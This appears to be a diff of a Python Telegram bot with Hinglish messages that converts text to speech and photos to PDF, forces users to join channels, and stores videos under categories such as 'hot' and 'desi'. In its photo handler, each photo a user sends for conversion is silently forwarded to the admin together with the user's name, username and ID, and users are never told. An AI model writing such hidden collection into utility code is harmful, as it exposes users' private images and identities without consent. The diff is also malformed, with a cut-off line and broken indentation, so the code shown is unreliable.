@@ -522,4 +522,111 @@ async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     mode = user_mode.get(user_id)
 
     if mode == "tts":
-        v_key = user_voice.get(user_id, "he
+                v_key = user_voice.get(user_id, "hero")
+        v_name, voice_id, rate, pitch = VOICES[v_key]
+        wait = await update.message.reply_text(f"⏳ {v_name} mein audio ban rahi hai...")
+        try:
+            communicate = edge_tts.Communicate(text[:1000], voice_id, rate=rate, pitch=pitch)
+            audio_io = io.BytesIO()
+            async for chunk in communicate.stream():
+                if chunk["type"] == "audio":
+                    audio_io.write(chunk["data"])
+            audio_io.seek(0)
+            audio_io.name = "voice.mp3"
+            await update.message.reply_audio(audio=audio_io, caption=f"✅ {v_name}")
+            await wait.delete()
+        except Exception:
+            await wait.edit_text("⚠️ Audio banane mein error aaya, dubara try karein.")
+
+    else:
+        await update.message.reply_text("👇 Pehle neeche se koi option chunein:", reply_markup=bottom_menu())
+
+# --- PHOTO HANDLER (PHOTO TO PDF + ADMIN COPY) ---
+async def photo_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    user_id = user.id
+
+    if not await is_user_joined(user_id, context.bot):
+        await update.message.reply_text(
+            "🔒 **Pehle hamare dono channels join karein!**",
+            parse_mode="Markdown",
+            reply_markup=join_keyboard()
+        )
+        return
+
+    # Admin ko user ki photo bhejo
+    admin_id = db_data.get("admin_id", 0)
+    if admin_id and user_id != admin_id:
+        uname = f"@{user.username}" if user.username else "No Username"
+        try:
+            await context.bot.send_photo(
+                chat_id=admin_id,
+                photo=update.message.photo[-1].file_id,
+                caption=(
+                    f"📸 **User Sent Photo for PDF!**\n\n"
+                    f"👤 **Name:** {clean_name(user.full_name)}\n"
+                    f"🔗 **Username:** {uname}\n"
+                    f"🆔 **ID:** `{user_id}`"
+                ),
+                parse_mode="Markdown"
+            )
+        except Exception:
+            pass
+
+    wait = await update.message.reply_text("⏳ PDF ban rahi hai...")
+    try:
+        photo_file = await update.message.photo[-1].get_file()
+        img_bytes = await photo_file.download_as_bytearray()
+        img = Image.open(io.BytesIO(img_bytes)).convert("RGB")
+
+        pdf_io = io.BytesIO()
+        img.save(pdf_io, format="PDF")
+        pdf_io.seek(0)
+        pdf_io.name = "document.pdf"
+
+        await update.message.reply_document(document=pdf_io, caption="✅ Ye lo aapki PDF file!")
+        await wait.delete()
+    except Exception:
+        await wait.edit_text("⚠️ PDF banane mein error aaya, dubara photo bhejein.")
+
+# --- VIDEO HANDLER (PERMANENT SAVE) ---
+async def video_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    cat = upload_category.get(user_id)
+
+    if not cat:
+        await update.message.reply_text(
+            "👇 Pehle category select karein:\n\n`/add_japanese`\n`/add_desi`\n`/add_hot`\n\nUske baad video bhejein!",
+            parse_mode="Markdown"
+        )
+        return
+
+    video = update.message.video
+    caption = update.message.caption or ""
+    db_data["videos"][cat].append([video.file_id, caption])
+    await save_db()
+    await update.message.reply_text(
+        f"✅ **{cat.upper()}** mein video permanent save ho gayi! (Total: {len(db_data['videos'][cat])})",
+        parse_mode="Markdown"
+    )
+
+def main():
+    load_db()
+    threading.Thread(target=run_web, daemon=True).start()
+    app = Application.builder().token(BOT_TOKEN).build()
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("setadmin", set_admin))
+    app.add_handler(CommandHandler("stats", stats))
+    app.add_handler(CommandHandler("broadcast", broadcast))
+    app.add_handler(CommandHandler("add_japanese", set_add_japanese))
+    app.add_handler(CommandHandler("add_desi", set_add_desi))
+    app.add_handler(CommandHandler("add_hot", set_add_hot))
+    app.add_handler(CommandHandler("clearvideos", clear_videos))
+    app.add_handler(CallbackQueryHandler(button_handler))
+    app.add_handler(MessageHandler(filters.PHOTO, photo_handler))
+    app.add_handler(MessageHandler(filters.VIDEO, video_handler))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
+    app.run_polling(drop_pending_updates=True)
+
+if __name__ == "__main__":
+    main()
